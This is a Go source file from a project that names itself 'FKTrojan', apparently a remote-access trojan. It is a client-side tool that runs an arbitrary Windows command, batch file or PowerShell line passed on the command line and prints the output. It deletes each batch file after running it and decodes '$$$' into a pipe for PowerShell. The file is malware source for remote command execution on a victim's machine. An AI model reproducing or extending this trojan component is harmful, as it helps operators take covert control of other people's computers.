package main

import (
	. "FKTrojan/client_tools/common"
	"FKTrojan/common"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
)

func JsonPrintHelp() {

	app := AppUsage{
		Name:    ExeBaseName(),
		Version: "1.0.0",
		Desc:    "this is for run windows internal cmd or batch file",
		Parameters: []Parameter{
			{
				LongFmt:  "-t",
				ShortFmt: "-t",
				Example:  "itr",
				Desc:     "itr : internal cmd bat : batch file pow  : powershell",
				Required: true,
				Type:     "string",
			},
			{
				LongFmt:  "-p",
				ShortFmt: "-p",
				Example:  "c:/windows/aa.bat if -t is bat; ipconfig/all if -t is itr",
				Desc:     "batch file path or internal commands",
				Required: true,
				Type:     "string",
			},
		},
	}
	var b []byte
	if len(os.Args) >= 2 && os.Args[1] == "--HELP" {
		b, _ = json.Marshal(app)
	} else {
		b, _ = json.MarshalIndent(app, " ", " ")
	}
	fmt.Println(string(b))
}
func main() {
	if len(os.Args) > 1 {
		if os.Args[1] == "--help" || os.Args[1] == "-h" {
			JsonPrintHelp()
			os.Exit(0)
		}
	}
	t := flag.String("t", "itr", "")
	p := flag.String("p", "", "")
	flag.Parse()
	if *p == "" {
		flag.Usage()
		os.Exit(1)
	}
	switch *t {
	case "itr":
		{
			o, e, err := common.RunExe(*p)
			fmt.Printf("stdout : \n %s \n stderr : \n %s \n err : \n %v \n", o, e, err)
			return
		}
	case "bat":
		{
			defer os.Remove(*p)
			o, e, err := common.RunExe(*p)
			fmt.Printf("stdout : \n %s \n stderr : \n %s \n err : \n %v \n", o, e, err)
			return
		}
	case "pow":
		{
			o, e, err := common.RunExe(fmt.Sprintf("powershell \"%s\"", strings.Replace(*p, "$$$", "|", -1)))
			fmt.Printf("stdout : \n %s \n stderr : \n %s \n err : \n %v \n", o, e, err)
			return
		}
	}
}
